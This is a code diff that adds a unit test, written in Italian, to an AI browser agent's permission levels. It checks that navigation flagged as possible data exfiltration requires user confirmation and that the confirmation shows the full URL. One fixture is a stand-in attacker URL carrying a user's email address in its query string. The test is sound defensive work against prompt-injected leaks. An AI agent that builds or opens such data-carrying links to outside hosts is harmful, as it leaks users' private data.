@@ -33,6 +33,16 @@ test('azioni reversibili → livello 1 (eseguono senza chiedere)', () => {
   assert.equal(AL.levelFor({ type: 'NAVIGA', url: 'https://x.it' }), 1);
 });
 
+test('NAVIGA con flag anti-esfiltrazione sale a livello 2 (conferma)', () => {
+  // Il flag `_exfil` lo inietta il main (taint-match in urlExfil.js), mai l'LLM:
+  // un link che porta fuori dati sensibili deve chiedere conferma, non aprirsi.
+  assert.equal(AL.levelFor({ type: 'NAVIGA', url: 'https://x.it/?d=segreto', _exfil: true }), 2);
+  // La spiegazione di conferma mostra l'URL completo (così l'utente lo giudica).
+  const d = AL.describe({ type: 'NAVIGA', url: 'https://attaccante.com/?e=mail@x.it', _exfil: true, _exfilReason: 'contiene un tuo dato' });
+  assert.ok(d.includes('https://attaccante.com/?e=mail@x.it'));
+  assert.ok(d.includes('contiene un tuo dato'));
+});
+
 test('PULISCI_TAB è livello 2, CANCELLA_ARCHIVIO è livello 3', () => {
   assert.equal(AL.levelFor({ type: 'PULISCI_TAB' }), 2);
   assert.equal(AL.levelFor({ type: 'CANCELLA_ARCHIVIO', query: 'ricette' }), 3);
